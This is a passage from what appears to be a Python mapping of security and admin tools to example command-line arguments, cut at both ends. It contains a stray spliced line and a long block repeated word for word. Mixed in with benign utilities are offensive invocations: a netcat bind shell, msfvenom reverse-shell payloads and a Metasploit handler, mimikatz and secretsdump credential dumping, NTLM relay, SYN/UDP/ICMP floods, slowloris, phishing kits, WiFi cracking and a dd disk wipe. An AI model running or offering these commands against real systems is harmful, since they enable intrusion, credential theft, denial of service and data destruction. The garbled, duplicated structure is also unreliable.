        ("-u http://target.com/page.php?id=1 --os=unix", "Unix target"),
        ("-u http://target.com/page.php?id=1 --technique=t", "Time-based"),
    ],
    "xsser": [
        ("-u http://target.com/page.php?q=test", "Basic XSS"),
        ("--auto -u http://target.com/page.php?q=test", "Auto mode"),
        ("-u http://target.com/page.php?q=test --Fp", "Final payload"),
    ],
    "xsstrike": [
        ("-u http://target.com/page.php?q=test", "Basic scan"),
        ("-u http://target.com/page.php?q=test --crawl", "Crawl mode"),
        ("-u http://target.com/page.php?q=test --fuzzer", "Fuzzer mode"),
        ("-u http://target.com/page.php?q=test --blind", "Blind XSS"),
    ],
    "dalfox": [
        ("url http://target.com/page.php?q=test", "Basic scan"),
        ("url http://target.com/page.php?q=test --cookie 'session=xxx'", "With cookie"),
        ("file urls.txt", "Bulk URLs"),
    ],
    "nosqlmap": [
        ("-u http://target.com/api", "Basic scan"),
        ("-u http://target.com/api --mongodb", "MongoDB target"),
        ("-u http://target.com/api --dump", "Dump data"),
    ],
    "arjun": [
        ("-u http://target.com/page.php", "Find params"),
        ("-u http://target.com/page.php -t 20", "20 threads"),
        ("-u http://target.com/api --json", "JSON output"),
    ],
    "paramspider": [
        ("-d target.com", "Domain scan"),
        ("-d target.com -o output.txt", "Save output"),
    ],
    "kiterunner": [
        ("scan http://target.com -w routes.kite", "API scan"),
        ("discover http://target.com -w routes.kite", "Discover mode"),
    ],
    "feroxbuster": [
        ("-u http://target.com -w wordlist.txt", "Directory brute"),
        ("-u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("-u http://target.com -w wordlist.txt -x php,html,txt", "Extensions"),
    ],
    "dirsearch": [
        ("-u http://target.com -w wordlist.txt", "Directory scan"),
        ("-u http://target.com -e php,html,txt -t 50", "Extensions"),
        ("-u http://target.com --json-report report.json", "JSON report"),
    ],
    "trivy": [
        ("image nginx:latest", "Scan image"),
        ("fs /", "Filesystem scan"),
        ("repo https://github.com/user/repo", "Repo scan"),
        ("--severity CRITICAL,HIGH image nginx:latest", "Critical only"),
    ],
    "grype": [
        ("nginx:latest", "Scan image"),
        ("dir:/app", "Directory scan"),
        ("-o json nginx:latest", "JSON output"),
    ],
    "dockle": [
        ("nginx:latest", "Check image"),
        ("--ignore CIS-DI-0001 nginx:latest", "Ignore check"),
    ],
    "hadolint": [
        ("Dockerfile", "Lint Dockerfile"),
        ("--ignore DL3008 Dockerfile", "Ignore rule"),
    ],
    "clair": [
        ("--config config.yaml", "With config"),
        ("--ip 0.0.0.0 --port 6060", "Custom port"),
    ],
    "kube-hunter": [
        ("--remote target.com", "Remote scan"),
        ("--active", "Active hunting"),
        ("--pod", "Inside pod"),
        ("--cidr 192.168.1.0/24", "Network range"),
    ],
    "kube-bench": [
        ("--config-dir /etc/kubernetes", "Config dir"),
        ("--version 1.20", "K8s version"),
        ("--check 1.1.1", "Single check"),
    ],
    "kubescape": [
        ("scan", "Full scan"),
        ("scan --include-namespaces dev,prod", "Specific namespaces"),
        ("scan framework nsa", "NSA framework"),
    ],
    "popeye": [
        ("-n dev", "Dev namespace"),
        ("--all-namespaces", "All namespaces"),
        ("-o json", "JSON output"),
    ],
    "checkov": [
        ("-d /terraform", "Terraform scan"),
        ("-d /kubernetes", "K8s scan"),
        ("-d / --framework all", "All frameworks"),
    ],
    "tfsec": [
        (".", "Current directory"),
        ("--format json .", "JSON output"),
        ("--exclude-downloaded-modules .", "Exclude modules"),
    ],
    "terrascan": [
        ("scan -d /terraform", "Scan directory"),
        ("scan -i terraform", "Terraform only"),
        ("scan -f output.json", "Output file"),
    ],
    "prowler": [
        ("-p custom-profile -r us-east-1", "AWS region"),
        ("-g securitygroup -n", "Security groups"),
        ("-M json -o output", "JSON output"),
    ],
    "scoutsuite": [
        ("aws --profile default", "AWS scan"),
        ("azure --cli", "Azure scan"),
        ("gcp --project-id my-project", "GCP scan"),
    ],
    "pacu": [
        ("--session mytest", "Create session"),
        ("--list-modules", "List modules"),
        ("--module-name iam__enum_users", "Run module"),
    ],
    "cloudmapper": [
        ("collect --account target", "Collect data"),
        ("report --account target", "Generate report"),
        ("webserver --account target", "Start web UI"),
    ],
    "lynis": [
        ("audit system", "System audit"),
        ("audit system --quick", "Quick scan"),
        ("audit system --pentest", "Pentest mode"),
    ],
    "chkrootkit": [
        ("-q", "Quiet mode"),
        ("-x", "Expert mode"),
    ],
    "rkhunter": [
        ("--check", "Full check"),
        ("--update", "Update database"),
        ("--sk", "Skip keypress"),
    ],
    "clamscan": [
        ("-r /", "Scan root"),
        ("-r --bell /home", "Alert on find"),
        ("-r --remove /tmp", "Auto remove"),
    ],
    "testdisk": [
        ("/dev/sda", "Analyze disk"),
        ("/dev/sda /log", "With log"),
    ],
    "photorec": [
        ("/dev/sda", "Recover from disk"),
        ("/d /recovery /dev/sda", "Output directory"),
    ],
    "foremost": [
        ("-i image.dd -o output/", "Carve files"),
        ("-t all -i image.dd -o output/", "All types"),
    ],
    "scalpel": [
        ("-c scalpel.conf image.dd -o output/", "With config"),
        ("image.dd -o output/", "Quick carve"),
    ],
    "bulk_extractor": [
        ("-o output/ image.dd", "Extract all"),
        ("-e email -o output/ image.dd", "Emails only"),
    ],
    "volatility3": [
        ("-f memory.dump windows.info", "System info"),
        ("-f memory.dump windows.pslist", "Process list"),
        ("-f memory.dump windows.netscan", "Network scan"),
        ("-f memory.dump windows.cmdline", "Command line"),
        ("-f memory.dump windows.malfind", "Malware find"),
    ],
    "apktool": [
        ("d app.apk", "Decompile"),
        ("b app/ -o new.apk", "Build"),
        ("d -f app.apk", "Force decompile"),
    ],
    "jadx": [
        ("app.apk", "Decompile"),
        ("-d output/ app.apk", "Output directory"),
        ("--deobf app.apk", "Deobfuscate"),
    ],
    "dex2jar": [
        ("classes.dex -o output.jar", "Convert DEX"),
        ("app.apk -o output.jar", "APK to JAR"),
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"),
        ("-o output/ app.apk", "Output directory"),
    ],
    "ghidra": [
        ("-import binary.exe -postscript AnalyzeHeadless", "Import analyze"),
        ("-process binary.exe -scriptPath /scripts", "Custom scripts"),
    ],
    "radare2": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
        ("-A -c 'afl' binary", "List functions"),
        ("-w binary", "Write mode"),
    ],
    "rizin": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
    ],
    "objdump": [
        ("-d binary", "Disassemble"),
        ("-x binary", "All headers"),
        ("-t binary", "Symbol table"),
    ],
    "strace": [
        ("-f command", "Follow forks"),
        ("-c command", "Summary count"),
        ("-e trace=file command", "File operations"),
        ("-o output.log command", "Save to file"),
    ],
    "ltrace": [
        ("command", "Library calls"),
        ("-f command", "Follow forks"),
        ("-o output.log command", "Save to file"),
    ],
    "gdb": [
        ("-q binary", "Quiet start"),
        ("-ex 'run' -ex 'bt' binary", "Run and backtrace"),
        ("-p PID", "Attach to process"),
    ],



    # === FINAL PRE-BUILT EXAMPLES ===
    "netstat": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
        ("-c", "Continuous mode"),
    ],
    "ss": [
        ("-tunap", "All connections"),
        ("-tlnp", "Listening ports"),
    ],
    "arp": [
        ("-a", "ARP table"),
        ("-d 192.168.1.1", "Delete entry"),
    ],
    "route": [
        ("-n", "Routing table"),
        ("add default gw 192.168.1.1", "Add gateway"),
    ],
    "iptables": [
        ("-L -n -v", "List rules"),
        ("-A INPUT -s IP -j DROP", "Block IP"),
        ("-A INPUT -p tcp --dport 80 -j ACCEPT", "Allow port 80"),
        ("-F", "Flush rules"),
    ],
    "ufw": [
        ("status", "Check status"),
        ("enable", "Enable firewall"),
        ("allow 80/tcp", "Allow port 80"),
        ("deny from IP", "Block IP"),
    ],
    "sysctl": [
        ("-a", "All settings"),
        ("net.ipv4.ip_forward=1", "Enable forwarding"),
    ],
    "mount": [
        ("-o ro,noexec /dev/sdb1 /mnt", "Read-only mount"),
        ("", "List mounts"),
    ],
    "dd": [
        ("if=/dev/sda of=image.dd bs=4M status=progress", "Disk image"),
        ("if=/dev/urandom of=file bs=1M count=100", "Random file"),
        ("if=/dev/zero of=/dev/sdb bs=1M", "Wipe disk"),
    ],
    "shred": [
        ("-n 7 -z file.txt", "7 pass shred"),
        ("-u file.txt", "Remove after"),
        ("-v file.txt", "Verbose"),
    ],
    "wipe": [
        ("-f file.txt", "Force wipe"),
        ("-r dir/", "Recursive wipe"),
    ],
    "srm": [
        ("-v file.txt", "Verbose secure delete"),
        ("-r dir/", "Recursive"),
    ],
    "openssl": [
        ("genrsa -out key.pem 2048", "Generate RSA key"),
        ("req -new -key key.pem -out csr.pem", "Generate CSR"),
        ("x509 -req -days 365 -in csr.pem -signkey key.pem -out cert.pem", "Self-sign cert"),
        ("s_client -connect target.com:443", "SSL connect"),
        ("enc -aes-256-cbc -in file.txt -out file.enc -pass pass:password", "Encrypt file"),
        ("enc -d -aes-256-cbc -in file.enc -out file.txt -pass pass:password", "Decrypt file"),
    ],
    "gpg": [
        ("--full-generate-key", "Generate key"),
        ("-c file.txt", "Symmetric encrypt"),
        ("-d file.gpg", "Decrypt"),
        ("--list-keys", "List keys"),
        ("--export -a user@email.com > public.key", "Export public key"),
    ],
    "base64": [
        ("file.txt", "Encode file"),
        ("-d file.b64", "Decode file"),
        ("-w 0 file.txt", "No line wrap"),
    ],
    "md5sum": [
        ("file.txt", "MD5 hash"),
        ("-c checksum.md5", "Check hashes"),
    ],
    "sha256sum": [
        ("file.txt", "SHA256 hash"),
        ("-c checksum.sha256", "Check hashes"),
    ],
    "zip": [
        ("archive.zip file1 file2", "Create archive"),
        ("-r archive.zip dir/", "Recursive"),
        ("-P password archive.zip file", "With password"),
        ("-e archive.zip file", "Encrypt"),
    ],
    "unzip": [
        ("archive.zip", "Extract"),
        ("-P password archive.zip", "Password extract"),
        ("archive.zip -d /output/", "Output directory"),
    ],
    "tar": [
        ("-czf archive.tar.gz dir/", "Create gzip"),
        ("-xzf archive.tar.gz", "Extract gzip"),
        ("-cjf archive.tar.bz2 dir/", "Create bzip2"),
    ],
    "wget": [
        ("https://target.com/file.txt", "Download"),
        ("-r -np -k https://target.com", "Mirror site"),
        ("-O output.txt https://target.com", "Save as"),
        ("--user-agent='Mozilla/5.0' https://target.com", "Custom UA"),
    ],
    "git": [
        ("clone https://github.com/user/repo.git", "Clone repo"),
        ("clone --depth 1 https://github.com/user/repo.git", "Shallow clone"),
        ("log --oneline", "Commit history"),
        ("diff", "Show changes"),
    ],
    "python3": [
        ("-m http.server 8080", "HTTP server"),
        ("-c 'print("hello")'", "One-liner"),
        ("script.py", "Run script"),
    ],
    "pip": [
        ("install package", "Install package"),
        ("install -r requirements.txt", "Install from file"),
        ("list", "List installed"),
        ("freeze > requirements.txt", "Export list"),
    ],
    "go": [
        ("build main.go", "Build binary"),
        ("run main.go", "Run without build"),
        ("install github.com/tool/cmd@latest", "Install tool"),
    ],
    "gem": [
        ("install package", "Install gem"),
        ("list", "List gems"),
    ],
    "npm": [
        ("install package", "Install package"),
        ("install -g package", "Global install"),
        ("start", "Start project"),
    ],
    "docker": [
        ("ps -a", "List containers"),
        ("images", "List images"),
        ("run -it ubuntu bash", "Run interactive"),
        ("build -t name .", "Build image"),
        ("exec -it container bash", "Exec into container"),
    ],
    "kubectl": [
        ("get pods", "List pods"),
        ("get pods --all-namespaces", "All namespaces"),
        ("get nodes", "List nodes"),
        ("exec -it pod -- bash", "Exec into pod"),
        ("apply -f deployment.yaml", "Apply config"),
        ("delete pod name", "Delete pod"),
    ],
    "terraform": [
        ("init", "Initialize"),
        ("plan", "Plan changes"),
        ("apply -auto-approve", "Apply changes"),
        ("destroy -auto-approve", "Destroy resources"),
    ],
    "ansible": [
        ("all -m ping", "Ping all hosts"),
        ("webservers -m command -a 'uptime'", "Run command"),
        ("-i inventory playbook.yml", "Run playbook"),
    ],
    "ssh": [
        ("user@host", "Basic connect"),
        ("-p 2222 user@host", "Custom port"),
        ("-i key.pem user@host", "Key auth"),
        ("-L 8080:localhost:80 user@host", "Local forward"),
        ("-R 8080:localhost:80 user@host", "Remote forward"),
        ("-D 1080 user@host", "SOCKS proxy"),
    ],
    "scp": [
        ("file.txt user@host:/path/", "Copy to remote"),
        ("user@host:/path/file.txt .", "Copy from remote"),
        ("-r dir/ user@host:/path/", "Recursive"),
    ],
    "rsync": [
        ("-av dir/ user@host:/path/", "Sync to remote"),
        ("-av user@host:/path/ dir/", "Sync from remote"),
        ("-av --delete dir/ /backup/", "Mirror sync"),
    ],
    "screen": [
        ("-S session_name", "Named session"),
        ("-r session_name", "Reattach"),
        ("-ls", "List sessions"),
    ],
    "tmux": [
        ("new -s session_name", "New session"),
        ("attach -t session_name", "Attach"),
        ("ls", "List sessions"),
    ],
    "htop": [
        ("", "Interactive process viewer"),
        ("-u username", "Filter user"),
    ],
    "iftop": [
        ("-i wlan0", "Interface traffic"),
        ("-P", "Show ports"),
    ],
    "nethogs": [
        ("wlan0", "Interface bandwidth"),
        ("-d 5 wlan0", "5s refresh"),
    ],
    "vnstat": [
        ("-i wlan0", "Interface stats"),
        ("-d", "Daily stats"),
        ("-m", "Monthly stats"),
    ],

# }' https://target.com/api", "JSON API"),
        ("-x http://proxy:8080 https://target.com", "Via proxy"),
        ("-k https://target.com", "Ignore SSL errors"),
        ("-u admin:password https://target.com", "Basic auth"),
    ],
    "wpscan": [
        ("--url http://target.com", "Basic scan"),
        ("--url http://target.com --enumerate p", "Enumerate plugins"),
        ("--url http://target.com --enumerate t", "Enumerate themes"),
        ("--url http://target.com --enumerate u", "Enumerate users"),
        ("--url http://target.com --passwords pass.txt --usernames admin", "Password brute"),
        ("--url http://target.com --api-token YOUR_TOKEN", "With API token"),
    ],
    "nikto": [
        ("-h http://target.com", "Basic scan"),
        ("-h https://target.com -ssl", "SSL scan"),
        ("-h http://target.com -Tuning 1", "Interesting files"),
        ("-h http://target.com -Tuning x", "XSS checks"),
        ("-h http://target.com -o report.html -Format htm", "HTML report"),
    ],
    "dirb": [
        ("http://target.com", "Basic scan"),
        ("http://target.com /usr/share/wordlists/dirb/big.txt", "Big wordlist"),
        ("https://target.com -w", "HTTPS no warnings"),
        ("http://target.com -X .php,.html,.txt", "With extensions"),
        ("http://target.com -u admin:password", "Basic auth"),
    ],
    "aircrack-ng": [
        ("-w rockyou.txt capture.cap", "Dictionary crack"),
        ("-b 00:11:22:33:44:55 capture.cap", "Target specific BSSID"),
        ("-a 2 -w rockyou.txt capture.cap", "WPA2 crack"),
        ("-a 1 capture.cap", "WEP crack"),
    ],
    "tcpdump": [
        ("-i any port 80", "HTTP traffic"),
        ("-i any host 192.168.1.1", "Specific host"),
        ("-i wlan0 -w capture.pcap", "Save to file"),
        ("-i any -n port not 22", "All except SSH"),
    ],
    "netcat": [
        ("-lvp 4444", "Listen on port 4444"),
        ("-e /bin/bash -lvp 4444", "Bind shell"),
        ("target.com 80", "Connect to port 80"),
        ("-zv target.com 1-1000", "Port scan"),
    ],
    "exiftool": [
        ("image.jpg", "Read metadata"),
        ("-a -G1 image.jpg", "All metadata"),
        ("-all= image.jpg", "Remove all metadata"),
        ("-Comment='Test' image.jpg", "Add comment"),
    ],
    "binwalk": [
        ("firmware.bin", "Scan file"),
        ("-e firmware.bin", "Extract files"),
        ("-Me firmware.bin", "Recursive extract"),
    ],
    "steghide": [
        ("embed -cf cover.jpg -ef secret.txt", "Embed file"),
        ("extract -sf stego.jpg", "Extract file"),
        ("embed -cf cover.jpg -ef secret.txt -p password", "With password"),
    ],
    "bettercap": [
        ("-iface wlan0", "Start on WiFi"),
        ("-eval 'net.probe on'", "Network probe"),
        ("-eval 'wifi.recon on'", "WiFi recon"),
        ("-eval 'net.sniff on'", "Packet sniffing"),
    ],
    "msfconsole": [
        ("-q", "Quiet start"),
        ("-x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'", "Reverse handler"),
        ("-x 'db_nmap -sV target.com'", "Nmap from MSF"),
    ],
    "msfvenom": [
        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe", "Windows reverse"),
        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
        ("-p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf", "Linux reverse"),
        ("-p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php", "PHP reverse"),
        ("-l payloads", "List all payloads"),
    ],
    "sherlock": [
        ("username", "Search username"),
        ("username --output results/ --csv", "Save results CSV"),
        ("username --site twitter,instagram,facebook", "Specific sites"),
        ("username --timeout 5", "Fast timeout"),
    ],
    "theHarvester": [
        ("-d target.com -b google", "Google search"),
        ("-d target.com -b all", "All sources"),
        ("-d target.com -b linkedin", "LinkedIn search"),
        ("-d target.com -b google -f report.html", "Save HTML"),
    ],
    "zphisher": [
        ("-p -t -o", "Interactive mode"),
        ("--ngrok", "Ngrok tunnel"),
        ("--cloudflared", "Cloudflare tunnel"),
    ],
    "evilginx2": [
        ("-p o365 -t target.com", "Office365 phishlet"),
        ("-p google -t target.com", "Google phishlet"),
        ("-p linkedin -t target.com", "LinkedIn phishlet"),
    ],
    "gophish": [
        ("--port 3333", "Start on port 3333"),
        ("--config config.json", "With config"),
    ],



    # === MORE PRE-BUILT EXAMPLES ===
    "masscan": [
        ("-p80,443 192.168.1.0/24 --rate=1000", "Web ports fast"),
        ("-p1-65535 target.com --rate=5000", "All ports fast"),
        ("-p22,80,443,8080,8443 target.com", "Common ports"),
        ("-p- target.com --rate=10000", "Full port max speed"),
        ("-p80,443 192.168.1.0/24 -oJ scan.json", "JSON output"),
    ],
    "rustscan": [
        ("-a target.com", "Fast scan"),
        ("-a target.com -p 1-1000", "Port range"),
        ("-a target.com --ulimit 5000 -t 2000", "Max speed"),
        ("-a 192.168.1.0/24 -p 22,80,443", "Network scan"),
    ],
    "amass": [
        ("enum -d target.com", "Basic enum"),
        ("enum -passive -d target.com", "Passive only"),
        ("enum -active -d target.com", "Active enum"),
        ("enum -d target.com -o output.txt", "Save output"),
        ("intel -d target.com", "Intelligence gather"),
    ],
    "subfinder": [
        ("-d target.com", "Basic subdomain"),
        ("-d target.com -silent", "Silent mode"),
        ("-d target.com -o subs.txt", "Save to file"),
        ("-dL domains.txt -o all_subs.txt", "Bulk domains"),
    ],
    "httpx": [
        ("-l subs.txt -o live.txt", "Check live hosts"),
        ("-l subs.txt -status-code -title", "Status and title"),
        ("-l subs.txt -tech-detect", "Tech detection"),
        ("-l subs.txt -silent -o live.txt", "Silent output"),
    ],
    "nuclei": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com -severity critical,high", "Critical/High only"),
        ("-l targets.txt -t cves/", "CVE templates"),
        ("-u http://target.com -t exposures/", "Exposure scan"),
        ("-u http://target.com -o report.txt", "Save report"),
    ],
    "wapiti": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com --scope page", "Page scope"),
        ("-u http://target.com -f txt -o report", "TXT report"),
    ],
    "skipfish": [
        ("-o /tmp/output http://target.com", "Basic scan"),
        ("-o /tmp/output -I target.com http://target.com", "Target only"),
    ],
    "testssl": [
        ("https://target.com", "Full test"),
        ("--each-cipher https://target.com", "Each cipher"),
        ("--json https://target.com", "JSON output"),
        ("--parallel https://target.com", "Fast parallel"),
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"),
        ("--json_out out.json target.com", "JSON output"),
    ],
    "responder": [
        ("-I eth0", "Start on eth0"),
        ("-I wlan0 -rdwv", "Full mode WiFi"),
        ("-I eth0 -A", "Analyze mode"),
    ],
    "impacket": [
        ("psexec.py domain/user:pass@target", "PSExec"),
        ("wmiexec.py domain/user:pass@target", "WMIExec"),
        ("smbexec.py domain/user:pass@target", "SMBExec"),
        ("secretsdump.py domain/user:pass@target", "Dump secrets"),
        ("ntlmrelayx.py -t smb://target -smb2support", "NTLM relay"),
    ],
    "crackmapexec": [
        ("smb target -u user -p pass", "SMB check"),
        ("smb 192.168.1.0/24 -u user -p pass --shares", "Network shares"),
        ("winrm target -u user -p pass -x 'whoami'", "WinRM exec"),
        ("mssql target -u sa -p password", "MSSQL check"),
    ],
    "bloodhound": [
        ("-d domain -u user -p pass -ns nameserver -c all", "Full collection"),
        ("-d domain -u user -p pass -ns nameserver", "Basic collection"),
    ],
    "mimikatz": [
        ("privilege::debug sekurlsa::logonpasswords", "Dump passwords"),
        ("lsadump::sam", "Dump SAM"),
        ("lsadump::secrets", "Dump secrets"),
        ("token::elevate", "Elevate token"),
    ],
    "chisel": [
        ("server -p 8080 --reverse", "Server reverse"),
        ("client server:8080 R:4444:localhost:4444", "Client reverse"),
    ],
    "ligolo": [
        ("-bind 0.0.0.0:11601", "Start proxy"),
        ("-connect proxy:11601 -ignore-cert", "Connect agent"),
    ],
    "proxychains": [
        ("nmap -sT target.com", "Nmap via proxy"),
        ("curl target.com", "Curl via proxy"),
        ("firefox", "Browser via proxy"),
    ],
    "torify": [
        ("nmap -sT target.com", "Nmap via Tor"),
        ("curl target.com", "Curl via Tor"),
    ],
    "wifite": [
        ("-i wlan0", "Basic scan"),
        ("-i wlan0 --wpa", "WPA only"),
        ("-i wlan0 --wep", "WEP only"),
        ("-i wlan0 --kill", "Kill interfering"),
    ],
    "reaver": [
        ("-i wlan0mon -b BSSID -vv", "WPS attack"),
        ("-i wlan0mon -b BSSID -c 6 -vv", "Specific channel"),
    ],
    "kismet": [
        ("-c wlan0", "Start capture"),
        ("-c wlan0 --no-server", "No web server"),
    ],
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood"),
        ("-1 target.com --flood", "ICMP flood"),
        ("-S target.com -p 80 --rand-source", "Random source SYN"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
    ],
    "ab": [
        ("-n 1000 -c 100 http://target.com/", "1000 requests 100 concurrent"),
        ("-n 10000 -c 200 -t 30 http://target.com/", "30s stress test"),
    ],
    "siege": [
        ("-c 100 -t 30s http://target.com", "100 users 30s"),
        ("-c 200 -r 50 http://target.com", "200 users 50 reps"),
        ("-f urls.txt", "URL list file"),
    ],



    # === EVEN MORE PRE-BUILT EXAMPLES ===
    "burpsuite": [
        ("--project=project.burp", "Open project"),
        ("--config=config.json", "Load config"),
        ("--collaborator-server", "Start collaborator"),
        ("--unpause-spidering", "Resume spider"),
    ],
    "zaproxy": [
        ("-cmd -quickurl http://target.com", "Quick scan"),
        ("-daemon -port 8080", "Daemon mode"),
        ("-cmd -quickurl http://target.com -quickout report.html", "Quick with report"),
    ],
    "commix": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
        ("-u http://target.com/page.php?id=1 --os=unix", "Unix target"),
        ("-u http://target.com/page.php?id=1 --technique=t", "Time-based"),
    ],
    "xsser": [
        ("-u http://target.com/page.php?q=test", "Basic XSS"),
        ("--auto -u http://target.com/page.php?q=test", "Auto mode"),
        ("-u http://target.com/page.php?q=test --Fp", "Final payload"),
    ],
    "xsstrike": [
        ("-u http://target.com/page.php?q=test", "Basic scan"),
        ("-u http://target.com/page.php?q=test --crawl", "Crawl mode"),
        ("-u http://target.com/page.php?q=test --fuzzer", "Fuzzer mode"),
        ("-u http://target.com/page.php?q=test --blind", "Blind XSS"),
    ],
    "dalfox": [
        ("url http://target.com/page.php?q=test", "Basic scan"),
        ("url http://target.com/page.php?q=test --cookie 'session=xxx'", "With cookie"),
        ("file urls.txt", "Bulk URLs"),
    ],
    "nosqlmap": [
        ("-u http://target.com/api", "Basic scan"),
        ("-u http://target.com/api --mongodb", "MongoDB target"),
        ("-u http://target.com/api --dump", "Dump data"),
    ],
    "arjun": [
        ("-u http://target.com/page.php", "Find params"),
        ("-u http://target.com/page.php -t 20", "20 threads"),
        ("-u http://target.com/api --json", "JSON output"),
    ],
    "paramspider": [
        ("-d target.com", "Domain scan"),
        ("-d target.com -o output.txt", "Save output"),
    ],
    "kiterunner": [
        ("scan http://target.com -w routes.kite", "API scan"),
        ("discover http://target.com -w routes.kite", "Discover mode"),
    ],
    "feroxbuster": [
        ("-u http://target.com -w wordlist.txt", "Directory brute"),
        ("-u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("-u http://target.com -w wordlist.txt -x php,html,txt", "Extensions"),
    ],
    "dirsearch": [
        ("-u http://target.com -w wordlist.txt", "Directory scan"),
        ("-u http://target.com -e php,html,txt -t 50", "Extensions"),
        ("-u http://target.com --json-report report.json", "JSON report"),
    ],
    "trivy": [
        ("image nginx:latest", "Scan image"),
        ("fs /", "Filesystem scan"),
        ("repo https://github.com/user/repo", "Repo scan"),
        ("--severity CRITICAL,HIGH image nginx:latest", "Critical only"),
    ],
    "grype": [
        ("nginx:latest", "Scan image"),
        ("dir:/app", "Directory scan"),
        ("-o json nginx:latest", "JSON output"),
    ],
    "dockle": [
        ("nginx:latest", "Check image"),
        ("--ignore CIS-DI-0001 nginx:latest", "Ignore check"),
    ],
    "hadolint": [
        ("Dockerfile", "Lint Dockerfile"),
        ("--ignore DL3008 Dockerfile", "Ignore rule"),
    ],
    "clair": [
        ("--config config.yaml", "With config"),
        ("--ip 0.0.0.0 --port 6060", "Custom port"),
    ],
    "kube-hunter": [
        ("--remote target.com", "Remote scan"),
        ("--active", "Active hunting"),
        ("--pod", "Inside pod"),
        ("--cidr 192.168.1.0/24", "Network range"),
    ],
    "kube-bench": [
        ("--config-dir /etc/kubernetes", "Config dir"),
        ("--version 1.20", "K8s version"),
        ("--check 1.1.1", "Single check"),
    ],
    "kubescape": [
        ("scan", "Full scan"),
        ("scan --include-namespaces dev,prod", "Specific namespaces"),
        ("scan framework nsa", "NSA framework"),
    ],
    "popeye": [
        ("-n dev", "Dev namespace"),
        ("--all-namespaces", "All namespaces"),
        ("-o json", "JSON output"),
    ],
    "checkov": [
        ("-d /terraform", "Terraform scan"),
        ("-d /kubernetes", "K8s scan"),
        ("-d / --framework all", "All frameworks"),
    ],
    "tfsec": [
        (".", "Current directory"),
        ("--format json .", "JSON output"),
        ("--exclude-downloaded-modules .", "Exclude modules"),
    ],
    "terrascan": [
        ("scan -d /terraform", "Scan directory"),
        ("scan -i terraform", "Terraform only"),
        ("scan -f output.json", "Output file"),
    ],
    "prowler": [
        ("-p custom-profile -r us-east-1", "AWS region"),
        ("-g securitygroup -n", "Security groups"),
        ("-M json -o output", "JSON output"),
    ],
    "scoutsuite": [
        ("aws --profile default", "AWS scan"),
        ("azure --cli", "Azure scan"),
        ("gcp --project-id my-project", "GCP scan"),
    ],
    "pacu": [
        ("--session mytest", "Create session"),
        ("--list-modules", "List modules"),
        ("--module-name iam__enum_users", "Run module"),
    ],
    "cloudmapper": [
        ("collect --account target", "Collect data"),
        ("report --account target", "Generate report"),
        ("webserver --account target", "Start web UI"),
    ],
    "lynis": [
        ("audit system", "System audit"),
        ("audit system --quick", "Quick scan"),
        ("audit system --pentest", "Pentest mode"),
    ],
    "chkrootkit": [
        ("-q", "Quiet mode"),
        ("-x", "Expert mode"),
    ],
    "rkhunter": [
        ("--check", "Full check"),
        ("--update", "Update database"),
        ("--sk", "Skip keypress"),
    ],
    "clamscan": [
        ("-r /", "Scan root"),
        ("-r --bell /home", "Alert on find"),
        ("-r --remove /tmp", "Auto remove"),
    ],
    "testdisk": [
        ("/dev/sda", "Analyze disk"),
        ("/dev/sda /log", "With log"),
    ],
    "photorec": [
        ("/dev/sda", "Recover from disk"),
        ("/d /recovery /dev/sda", "Output directory"),
    ],
    "foremost": [
        ("-i image.dd -o output/", "Carve files"),
        ("-t all -i image.dd -o output/", "All types"),
    ],
    "scalpel": [
        ("-c scalpel.conf image.dd -o output/", "With config"),
        ("image.dd -o output/", "Quick carve"),
    ],
    "bulk_extractor": [
        ("-o output/ image.dd", "Extract all"),
        ("-e email -o output/ image.dd", "Emails only"),
    ],
    "volatility3": [
        ("-f memory.dump windows.info", "System info"),
        ("-f memory.dump windows.pslist", "Process list"),
        ("-f memory.dump windows.netscan", "Network scan"),
        ("-f memory.dump windows.cmdline", "Command line"),
        ("-f memory.dump windows.malfind", "Malware find"),
    ],
    "apktool": [
        ("d app.apk", "Decompile"),
        ("b app/ -o new.apk", "Build"),
        ("d -f app.apk", "Force decompile"),
    ],
    "jadx": [
        ("app.apk", "Decompile"),
        ("-d output/ app.apk", "Output directory"),
        ("--deobf app.apk", "Deobfuscate"),
    ],
    "dex2jar": [
        ("classes.dex -o output.jar", "Convert DEX"),
        ("app.apk -o output.jar", "APK to JAR"),
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"),
        ("-o output/ app.apk", "Output directory"),
    ],
    "ghidra": [
        ("-import binary.exe -postscript AnalyzeHeadless", "Import analyze"),
        ("-process binary.exe -scriptPath /scripts", "Custom scripts"),
    ],
    "radare2": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
        ("-A -c 'afl' binary", "List functions"),
        ("-w binary", "Write mode"),
    ],
    "rizin": [
        ("-A binary", "Auto analyze"),
        ("-d binary", "Debug mode"),
    ],
    "objdump": [
        ("-d binary", "Disassemble"),
        ("-x binary", "All headers"),
        ("-t binary", "Symbol table"),
    ],
    "strace": [
        ("-f command", "Follow forks"),
        ("-c command", "Summary count"),
        ("-e trace=file command", "File operations"),
        ("-o output.log command", "Save to file"),
    ],
    "ltrace": [
        ("command", "Library calls"),
        ("-f command", "Follow forks"),
        ("-o output.log command", "Save to file"),
    ],
    "gdb": [
        ("-q binary", "Quiet start"),
        ("-ex 'run' -ex 'bt' binary", "Run and backtrace"),
